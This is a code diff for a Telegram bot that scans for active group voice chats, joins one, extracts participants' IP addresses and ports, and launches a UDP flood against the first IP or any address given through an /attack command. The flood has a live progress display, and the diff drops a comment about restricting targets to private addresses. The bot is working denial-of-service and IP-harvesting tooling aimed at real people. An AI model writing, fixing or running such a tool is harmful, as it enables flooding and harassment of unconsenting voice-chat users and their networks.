@@ -1,4 +1,4 @@
-"""Enhanced Telegram bot controller with auto-attack workflow."""
+"""Fixed bot handler — stable state, no crashes during attack."""
 
 from __future__ import annotations
 
@@ -62,7 +62,7 @@ class BotHandler:
         self.scan_limit = scan_limit
         self.ctx = SessionContext()
 
-        # Register handlers without ADMIN_ID restrictions for local testing.
+    def register_handlers(self):
         self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan")))
         self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop")))
         self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack")))
@@ -70,256 +70,241 @@ class BotHandler:
         self.bot.add_handler(CallbackQueryHandler(self.on_callback))
 
     async def on_scan(self, client: Client, message):
-        """Scan for active voice chats."""
-        if self.ctx.state != BotState.IDLE:
-            await message.reply(f"⚠️ Currently in state: {self.ctx.state.value}. Use /stop to reset.")
+        if self.ctx.state not in (BotState.IDLE,):
+            await message.reply(
+                f"⚠️ State: {self.ctx.state.value}\n/stop maar ke reset kar phir /scan"
+            )
             return
 
         self.ctx.state = BotState.SCANNING
-        status = await message.reply("🔎 Scanning for active voice chats...")
-        
+        status = await message.reply("🔎 Scanning for active VCs...")
+
         try:
             records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
-        except FloodWait as wait_err:
-            await status.edit_text(f"⚠️ FloodWait: retry after {wait_err.value} seconds.")
-            self.ctx.state = BotState.IDLE
-            return
+        except FloodWait as e:
+            wait = e.value + 2
+            await status.edit_text(f"⏳ FloodWait {e.value}s — auto waiting...")
+            await asyncio.sleep(wait)
+            try:
+                records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
+            except Exception as exc:
+                await status.edit_text(f"❌ Retry fail: {exc}")
+                self.ctx.state = BotState.IDLE
+                return
         except Exception as exc:
             LOGGER.exception("Scan failed")
-            await status.edit_text(f"❌ Scan failed: {exc}")
+            await status.edit_text(f"❌ Scan fail: {exc}")
             self.ctx.state = BotState.IDLE
             return
 
         self.ctx.active_records = records
-        
+
         if not records:
-            await status.edit_text("❌ No active voice chat found.\n\nStart a VC in your group first, then run /scan")
+            await status.edit_text(
+                "❌ Koi active VC nahi mili.\n\n"
+                "Check karo:\n"
+                "• Kisi group mein VC chal rahi ho\n"
+                "• SESSION_STRING wala account us group mein member ho"
+            )
             self.ctx.state = BotState.IDLE
             return
 
-        # Create selection buttons
         buttons = []
         for idx, item in enumerate(records):
-            btn_text = f"{idx + 1}. {item.title[:35]}" if len(item.title) <= 35 else f"{idx + 1}. {item.title[:32]}..."
-            buttons.append([InlineKeyboardButton(btn_text, callback_data=f"select:{idx}")])
+            title = item.title[:35] if len(item.title) <= 35 else item.title[:32] + "..."
+            buttons.append([InlineKeyboardButton(
+                f"{idx + 1}. {title}", callback_data=f"select:{idx}"
+            )])
 
         await status.edit_text(
-            f"✅ Found {len(records)} active voice chat(s):\n\nSelect a target:",
+            f"✅ {len(records)} active VC mili:\n\nSelect karo:",
             reply_markup=InlineKeyboardMarkup(buttons)
         )
         self.ctx.state = BotState.SELECTION
 
     async def on_stop(self, client: Client, message):
-        """Stop all operations."""
         self.engine.stop()
-        if self.ctx.progress_task:
+        if self.ctx.progress_task and not self.ctx.progress_task.done():
             self.ctx.progress_task.cancel()
+            try:
+                await self.ctx.progress_task
+            except asyncio.CancelledError:
+                pass
             self.ctx.progress_task = None
-        
-        # Leave VC if joined
+
         if self.ctx.selected_record:
             try:
                 await self.detector.leave_call(self.ctx.selected_record)
-            except:
+            except Exception:
                 pass
 
-        self.ctx = SessionContext()  # Reset context
-        await message.reply("🛑 All operations stopped. State reset to IDLE.")
+        self.ctx = SessionContext()
+        await message.reply("🛑 Sab band. State reset → IDLE.")
 
     async def on_status(self, client: Client, message):
-        """Show current status."""
-        status_text = f"""
-📊 Current Status:
-• State: {self.ctx.state.value}
-• Selected VC: {self.ctx.selected_record.title if self.ctx.selected_record else 'None'}
-• Target IP: {self.ctx.target_ip or 'Not set'}
-• Target Port: {self.ctx.target_port or 'Not set'}
-• Attack Pending: {'Yes' if self.ctx.pending_attack else 'No'}
-"""
-        await message.reply(status_text)
+        vc_name = self.ctx.selected_record.title if self.ctx.selected_record else "None"
+        await message.reply(
+            f"📊 Current Status:\n"
+            f"• State: {self.ctx.state.value}\n"
+            f"• Selected VC: {vc_name}\n"
+            f"• Target IP: {self.ctx.target_ip or 'Not set'}\n"
+            f"• Target Port: {self.ctx.target_port or 'Not set'}\n"
+            f"• Attack Pending: {'Yes' if self.ctx.pending_attack else 'No'}"
+        )
 
     async def on_attack_ip(self, client: Client, message):
-        """Manual attack command on specific IP."""
         args = message.text.split()
         if len(args) < 3:
-            await message.reply("Usage: /attack <ip> <port> [duration_seconds]\nExample: /attack 192.168.1.1 8080 30")
+            await message.reply(
+                "❌ Usage: /attack <ip> <port> [seconds]\n"
+                "Example: /attack 192.168.1.1 8080 60"
+            )
             return
 
         ip = args[1]
-        port = int(args[2])
-        duration = int(args[3]) if len(args) > 3 else 30
+        try:
+            port = int(args[2])
+            duration = int(args[3]) if len(args) > 3 else 30
+        except ValueError:
+            await message.reply("❌ Port aur duration number hone chahiye.")
+            return
+
         duration = min(duration, self.max_duration)
 
         if not is_valid_port(port):
-            await message.reply("❌ Invalid port. Must be 1-65535.")
+            await message.reply("❌ Invalid port. 1-65535 ke beech hona chahiye.")
             return
-
-        # For authorized testing, we can bypass private IP check
-        # In production, uncomment: if not is_private_or_loopback(ip): ...
 
         await self._start_attack(message.chat.id, ip, port, duration)
 
     async def on_callback(self, client: Client, callback_query):
-        """Handle callback queries."""
         data = callback_query.data or ""
-        
-        # Handle VC selection
+
+        handlers = {
+            "join:yes": self._handle_join_yes,
+            "join:no": self._handle_join_no,
+            "manual_join:confirm": self._handle_manual_join_confirm,
+            "manual_join:cancel": self._handle_manual_join_cancel,
+            "attack:confirm": self._handle_attack_confirm,
+            "attack:cancel": self._handle_attack_cancel,
+            "leave": self._handle_leave,
+            "global_stop": self._handle_global_stop,
+        }
+
         if data.startswith("select:"):
             await self._handle_vc_selection(callback_query, data)
             return
 
-        # Handle join confirmation
-        if data == "join:yes":
-            await self._handle_join_yes(callback_query)
-            return
-
-        if data == "manual_join:confirm":
-            await self._handle_manual_join_confirm(callback_query)
-            return
-
-        if data == "manual_join:cancel":
-            self.ctx.state = BotState.IDLE
-            self.ctx.manual_join_requested = False
-            await callback_query.message.edit_text("❌ Cancelled manual join flow.")
-            await callback_query.answer()
-            return
-        
-        if data == "join:no":
-            self.ctx.state = BotState.IDLE
-            await callback_query.message.edit_text("❌ Cancelled.")
-            await callback_query.answer()
-            return
-
-        # Handle attack confirmation
-        if data == "attack:confirm":
-            await self._handle_attack_confirm(callback_query)
-            return
-        
-        if data == "attack:cancel":
-            self.ctx.pending_attack = False
-            self.ctx.state = BotState.READY
-            await callback_query.message.edit_text("❌ Attack cancelled.")
-            await callback_query.answer()
-            return
-
-        # Handle leave
-        if data == "leave":
-            await self._handle_leave(callback_query)
+        if data in handlers:
+            await handlers[data](callback_query)
             return
 
         if data == "manual_attack":
             await callback_query.answer("Use /attack <ip> <port> [duration]")
-            return
-
-        # Handle global stop
-        if data == "global_stop":
-            self.engine.stop()
-            self.ctx.pending_attack = False
-            self.ctx.state = BotState.READY
-            await callback_query.answer("🛑 Attack stopped!")
-            return
 
     async def _handle_vc_selection(self, callback_query, data):
-        """Handle VC selection."""
         try:
             index = int(data.split(":", 1)[1])
             self.ctx.selected_record = self.ctx.active_records[index]
-            
+
             await callback_query.message.edit_text(
                 f"🎯 Selected: {self.ctx.selected_record.title}\n\n"
-                f"Join this VC and extract connection info?",
-                reply_markup=InlineKeyboardMarkup([
-                    [
-                        InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"),
-                        InlineKeyboardButton("❌ CANCEL", callback_data="join:no")
-                    ]
-                ])
+                f"VC join karke IP extract karein?",
+                reply_markup=InlineKeyboardMarkup([[
+                    InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"),
+                    InlineKeyboardButton("❌ CANCEL", callback_data="join:no")
+                ]])
             )
             await callback_query.answer()
         except Exception as exc:
-            LOGGER.exception("Selection error")
             await callback_query.answer(f"Error: {exc}", show_alert=True)
 
+    async def _handle_join_no(self, callback_query):
+        self.ctx.state = BotState.IDLE
+        await callback_query.message.edit_text("❌ Cancel.")
+        await callback_query.answer()
+
     async def _handle_join_yes(self, callback_query):
-        """Handle join confirmation."""
         if not self.ctx.selected_record:
-            await callback_query.answer("No VC selected!", show_alert=True)
+            await callback_query.answer("Koi VC select nahi!", show_alert=True)
             return
 
         self.ctx.state = BotState.JOINING
-        await callback_query.message.edit_text("⏳ Joining VC and extracting metadata...")
+        await callback_query.message.edit_text("⏳ VC join karke IP extract ho raha hai...")
         await callback_query.answer()
 
         try:
             metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
             self.ctx.extracted_metadata = metadata
 
-            # If bot cannot join directly, ask for manual join + confirm.
             if not metadata.get("joined"):
                 self.ctx.state = BotState.MANUAL_JOIN_WAIT
                 self.ctx.manual_join_requested = True
-                notice = metadata.get("notice") or "Auto join failed."
+                notice = metadata.get("notice") or "Auto join fail."
                 await callback_query.message.edit_text(
                     f"⚠️ {notice}\n\n"
-                    f"Please join the VC manually from client account, then tap confirm.\n"
-                    f"After confirmation, IP extraction and attack flow will continue.",
+                    f"Apne account se manually VC join kar, phir confirm dabao.",
                     reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("✅ Manual Join Ho Gaya", callback_data="manual_join:confirm")],
+                        [InlineKeyboardButton("✅ Join Ho Gaya", callback_data="manual_join:confirm")],
                         [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
-                    ]),
+                    ])
                 )
                 return
 
-            await self._process_extracted_metadata(callback_query, metadata)
+            await self._process_metadata(callback_query, metadata)
 
         except Exception as exc:
-            LOGGER.exception("Join/Extract failed")
+            LOGGER.exception("Join/Extract fail")
             self.ctx.state = BotState.IDLE
-            await callback_query.message.edit_text(f"❌ Join/Extract failed: {exc}")
+            await callback_query.message.edit_text(f"❌ Fail: {exc}")
+
+    async def _handle_manual_join_cancel(self, callback_query):
+        self.ctx.state = BotState.IDLE
+        self.ctx.manual_join_requested = False
+        await callback_query.message.edit_text("❌ Cancel.")
+        await callback_query.answer()
 
     async def _handle_manual_join_confirm(self, callback_query):
-        """Re-check metadata after manual join confirmation."""
         if not self.ctx.selected_record:
-            await callback_query.answer("No VC selected!", show_alert=True)
+            await callback_query.answer("Koi VC select nahi!", show_alert=True)
             return
 
         self.ctx.state = BotState.JOINING
-        await callback_query.message.edit_text("⏳ Verifying manual join and extracting IP metadata...")
+        await callback_query.message.edit_text("⏳ Manual join verify karke IP extract ho raha hai...")
         await callback_query.answer()
 
         try:
             metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
             self.ctx.extracted_metadata = metadata
             self.ctx.manual_join_requested = False
-            await self._process_extracted_metadata(callback_query, metadata)
+            await self._process_metadata(callback_query, metadata)
         except Exception as exc:
-            LOGGER.exception("Manual join confirmation failed")
+            LOGGER.exception("Manual join confirm fail")
             self.ctx.state = BotState.IDLE
             self.ctx.manual_join_requested = False
-            await callback_query.message.edit_text(f"❌ Metadata extraction failed after manual join: {exc}")
+            await callback_query.message.edit_text(f"❌ Fail: {exc}")
 
-    async def _process_extracted_metadata(self, callback_query, metadata: dict):
-        """Normalize extracted metadata and show attack actions."""
+    async def _process_metadata(self, callback_query, metadata: dict):
         extracted_ips = metadata.get("extracted_ips", [])
 
         if not extracted_ips:
             self.ctx.state = BotState.READY
             await callback_query.message.edit_text(
-                "⚠️ VC access confirmed but no IP addresses extracted.\n\n"
-                "Use /attack <ip> <port> to continue manually."
+                "⚠️ VC access hua but IP nahi mila.\n\n"
+                "Use /attack <ip> <port> manually."
             )
             return
 
-        ip_list_text = "\n".join([
-            f"• {ip['ip']}:{ip['port']} ({ip['type']})"
-            for ip in extracted_ips[:5]
+        ip_text = "\n".join([
+            f"• {x['ip']}:{x['port']} ({x['type']})"
+            for x in extracted_ips[:5]
         ])
 
-        join_status = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
+        join_txt = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
         await callback_query.message.edit_text(
-            f"{join_status}\n\n"
-            f"🎯 Extracted IPs:\n{ip_list_text}\n\n"
-            f"Select an action:",
+            f"{join_txt}\n\n"
+            f"🎯 Extracted IPs:\n{ip_text}\n\n"
+            f"Action select karo:",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
                 [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
@@ -329,106 +314,123 @@ class BotHandler:
 
         self.ctx.state = BotState.CONFIRM_ATTACK
         self.ctx.pending_attack = True
-
-        first_ip = extracted_ips[0]
-        self.ctx.target_ip = first_ip['ip']
-        self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001
+        first = extracted_ips[0]
+        self.ctx.target_ip = first["ip"]
+        self.ctx.target_port = first["port"] if first["port"] > 0 else 10001
 
     async def _handle_attack_confirm(self, callback_query):
-        """Handle attack confirmation."""
         if not self.ctx.pending_attack or not self.ctx.target_ip:
-            await callback_query.answer("No attack pending!", show_alert=True)
+            await callback_query.answer("Koi attack pending nahi!", show_alert=True)
             return
 
-        await callback_query.answer("🚀 Starting attack...")
-        
-        # Start attack
+        await callback_query.answer("🚀 Attack shuru...")
         await self._start_attack(
             callback_query.message.chat.id,
             self.ctx.target_ip,
             self.ctx.target_port,
-            60  # Default 60 seconds
+            60
         )
 
+    async def _handle_attack_cancel(self, callback_query):
+        self.ctx.pending_attack = False
+        self.ctx.state = BotState.READY
+        await callback_query.message.edit_text("❌ Attack cancel.")
+        await callback_query.answer()
+
     async def _start_attack(self, chat_id: int, ip: str, port: int, duration: int):
-        """Start attack on specified target."""
         self.ctx.state = BotState.ATTACKING
-        
+
         dashboard = await self.bot.send_message(
             chat_id,
-            f"🚀 Starting attack on {ip}:{port} for {duration}s..."
+            f"🚀 Attack shuru: {ip}:{port} — {duration}s..."
         )
-        
+
+        # Cancel old progress task if any
+        if self.ctx.progress_task and not self.ctx.progress_task.done():
+            self.ctx.progress_task.cancel()
+            try:
+                await self.ctx.progress_task
+            except asyncio.CancelledError:
+                pass
+
         self.ctx.progress_task = asyncio.create_task(
             self._progress_loop(dashboard.chat.id, dashboard.id)
         )
 
         try:
             stats = await self.engine.run_udp_test(ip=ip, port=port, duration=duration)
-            
+
             await dashboard.edit_text(
-                f"✅ Attack completed on {ip}:{port}\n\n"
-                f"📊 Statistics:\n"
-                f"• Packets Sent: {stats.sent_packets}\n"
-                f"• Failed: {stats.failed_packets}\n"
+                f"✅ Attack complete: {ip}:{port}\n\n"
+                f"📊 Stats:\n"
+                f"• Packets Sent: {stats.sent_packets:,}\n"
+                f"• Failed: {stats.failed_packets:,}\n"
                 f"• Data: {human_bytes(stats.bytes_sent)}\n"
                 f"• RPS: {stats.rps:.2f}\n"
                 f"• Duration: {stats.elapsed:.1f}s"
             )
-            
+
         except Exception as exc:
-            LOGGER.exception("Attack failed")
-            await dashboard.edit_text(f"❌ Attack failed: {exc}")
-        
+            LOGGER.exception("Attack fail")
+            try:
+                await dashboard.edit_text(f"❌ Attack fail: {exc}")
+            except Exception:
+                pass
+
         finally:
-            if self.ctx.progress_task:
+            if self.ctx.progress_task and not self.ctx.progress_task.done():
                 self.ctx.progress_task.cancel()
-                self.ctx.progress_task = None
-            
+                try:
+                    await self.ctx.progress_task
+                except asyncio.CancelledError:
+                    pass
+            self.ctx.progress_task = None
             self.ctx.state = BotState.READY
             self.ctx.pending_attack = False
 
     async def _handle_leave(self, callback_query):
-        """Handle leave VC."""
         if self.ctx.selected_record:
             try:
                 await self.detector.leave_call(self.ctx.selected_record)
-                await callback_query.answer("Left VC")
+                await callback_query.answer("VC se nikal gaye")
             except Exception as exc:
                 await callback_query.answer(f"Leave error: {exc}")
-        
+
         self.ctx.state = BotState.IDLE
         self.ctx.pending_attack = False
-        await callback_query.message.edit_text("👋 Left VC. Use /scan to start again.")
+        await callback_query.message.edit_text("👋 VC se nikal gaye. /scan se dobara shuru karo.")
+
+    async def _handle_global_stop(self, callback_query):
+        self.engine.stop()
+        self.ctx.pending_attack = False
+        self.ctx.state = BotState.READY
+        await callback_query.answer("🛑 Attack band!")
 
     async def _progress_loop(self, chat_id: int, message_id: int):
-        """Update attack progress."""
         while True:
-            await asyncio.sleep(5)
-            stats = self.engine.stats
-            
-            if not stats.running:
-                break
-
             try:
+                await asyncio.sleep(5)
+                stats = self.engine.stats
+
+                if not stats.running:
+                    break
+
                 await self.bot.edit_message_text(
                     chat_id=chat_id,
                     message_id=message_id,
                     text=(
-                        f"🚀 ATTACK IN PROGRESS\n\n"
+                        f"🚀 ATTACK CHAL RAHA HAI\n\n"
                         f"🎯 Target: {self.ctx.target_ip}:{self.ctx.target_port}\n"
-                        f"📤 Data Sent: {human_bytes(stats.bytes_sent)}\n"
-                        f"📦 Packets: {stats.sent_packets} sent / {stats.failed_packets} failed\n"
+                        f"📤 Data: {human_bytes(stats.bytes_sent)}\n"
+                        f"📦 Packets: {stats.sent_packets:,} sent / {stats.failed_packets:,} fail\n"
                         f"⚡ RPS: {stats.rps:.2f}\n"
-                        f"⏱️ Elapsed: {stats.elapsed:.1f}s"
+                        f"⏱️ Time: {stats.elapsed:.1f}s"
                     ),
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="global_stop")]
-                    ])
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton("🛑 STOP", callback_data="global_stop")
+                    ]])
                 )
+            except asyncio.CancelledError:
+                break
             except Exception:
-                pass  # Ignore edit errors
-
-    def register_handlers(self):
-        """Additional handler registration if needed."""
-        pass
+                pass
